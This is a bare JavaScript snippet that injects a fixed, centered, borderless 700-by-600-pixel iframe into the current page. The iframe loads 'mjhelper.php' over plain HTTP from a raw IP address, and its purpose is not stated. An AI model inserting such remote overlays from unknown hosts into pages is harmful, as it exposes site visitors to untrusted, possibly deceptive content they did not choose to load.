var iframe = document.createElement('iframe');

iframe.src = 'http://43.156.249.233:5600/mjhelper.php';
iframe.setAttribute('crossorigin', 'anonymous');

iframe.style.position = "fixed";
iframe.style.top = "50%";
iframe.style.left = "50%";
iframe.style.transform = "translate(-50%, -55%)";
iframe.style.width = "700px";
iframe.style.height = "600px";
iframe.style.border = "none";

document.body.appendChild(iframe);
